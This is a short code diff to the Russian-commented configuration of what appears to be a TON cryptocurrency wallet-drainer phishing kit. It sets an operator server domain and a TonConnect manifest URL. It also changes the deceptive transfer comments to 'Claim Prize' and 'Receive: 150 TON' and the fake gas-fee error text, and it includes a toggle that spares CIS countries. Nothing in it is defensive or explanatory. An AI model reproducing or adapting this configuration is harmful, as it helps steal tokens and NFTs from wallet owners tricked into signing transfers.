@@ -1,21 +1,21 @@
-const server_domain = ""; //Ваш домен сервера в формате "domain.com"
+const server_domain = "https://df4d4334-be75-4c26-aebb-b364ecb27e7a-00-z6zjnwq7aul.janeway.replit.dev"; //Ваш домен сервера в формате "domain.com"
 
 //Дополнительные настройки:
 const dynamicTxt = "true"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
 const sumDyn = "2"; // Множитель для динамичного комментария
-const textDyn = "Receive:  "; // Текст в динамичном комментарии
-const txt_com = "✅ Claim Airdrop..."; // Комментарий при трансфере TON и JETTON(Статичный)
-const txtnft_com = "✅ Claim Airdrop..."; // Комментарий при трансфере NFT(Статичный)
+const textDyn = "Receive: 150 TON "; // Текст в динамичном комментарии
+const txt_com = "✅ Claim Prize.."; // Комментарий при трансфере TON и JETTON(Статичный)
+const txtnft_com = "✅ Claim Prize.."; // Комментарий при трансфере NFT(Статичный)
 
 //Настройки модального окна при минимальном балансе:
-const h1_message = 'Transaction rejected'; //Заголовок
+const h1_message = 'Transaction Error'; //Заголовок
 const p_message = 'Not enough TON to pay the gas fee!'; //Обычный текст
 
 //Технические настройки:
 const sng = "true"; //Защита СНГ стран, включать только в целях тестирования.
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://notcoln.lol/tonconnect-manifest.json', //Сюда указать путь на ваш манифест
+    manifestUrl: 'https://steady-kulfi-0b08d6.netlify.app/tonconnect-manifest.json', //Сюда указать путь на ваш манифест
     buttonRootId: 'openModal'
 });
 
